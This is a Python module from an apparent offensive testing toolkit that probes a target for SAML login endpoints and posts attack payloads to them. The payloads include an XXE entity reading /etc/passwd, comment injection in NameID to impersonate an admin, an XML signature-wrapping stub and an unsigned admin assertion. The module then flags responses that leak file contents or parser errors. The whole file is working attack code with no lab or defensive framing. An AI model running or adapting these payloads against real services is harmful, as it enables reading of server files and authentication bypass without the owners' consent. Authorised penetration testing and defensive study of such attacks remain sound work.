"""saml_attack — SAML signature bypass, XXE, comment injection, XSW"""
from core.http import HttpClient
from core.probe import Probe

# XML Signature Wrapping (XSW) + comment injection + XXE in SAML
PAYLOADS = {
    "xxe_in_saml": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    "comment_inject": '<saml:NameID>admin<!---->@victim.com</saml:NameID>',
    "sig_wrap": '<Signature xmlns="http://www.w3.org/2000/09/xmldsig#"><SignedInfo>...</SignedInfo></Signature>',
    "no_sig": '<saml:Assertion ID="x"><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion>',
}

SAML_PATHS = ["/saml/acs", "/saml/SSO", "/Shibboleth.sso/SAML2/POST",
              "/auth/saml", "/sso/saml", "/api/saml/acs"]

MARKERS = ["root:x:0:0", "javax.xml", "saml:", "Signature", "parse error",
           "XMLSyntaxError", "unbound prefix", "Signature validation failed"]

class SamlAttack:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        probe = Probe(session, logger)
        findings = []

        # 1. find SAML endpoints
        for path in SAML_PATHS:
            r = http.get(base + path)
            if r and r.status_code not in (404, 405):
                print(f"  [+] SAML endpoint: {path} ({r.status_code})")
                logger.finding("saml_endpoint", "info", path)
                findings.append({"path": path, "type": "endpoint"})

        # 2. post payloads
        for name, payload in PAYLOADS.items():
            for path in SAML_PATHS[:3]:
                r = http.post(base + path, data={"SAMLResponse": payload},
                              headers={"Content-Type": "application/x-www-form-urlencoded"})
                if not r: continue
                low = r.text.lower()
                hit = next((m for m in MARKERS if m.lower() in low), None)
                if hit:
                    print(f"  [!] {name} on {path}: {hit}")
                    sev = "critical" if hit in ("root:x:0:0",) else "high"
                    findings.append({"path": path, "payload": name, "marker": hit,
                                     "severity": sev, "verified": True})
                    logger.finding("saml", sev, f"{name} {path} -> {hit}")

        print(f"[saml_attack] total: {len(findings)}")
        return {"findings": findings}
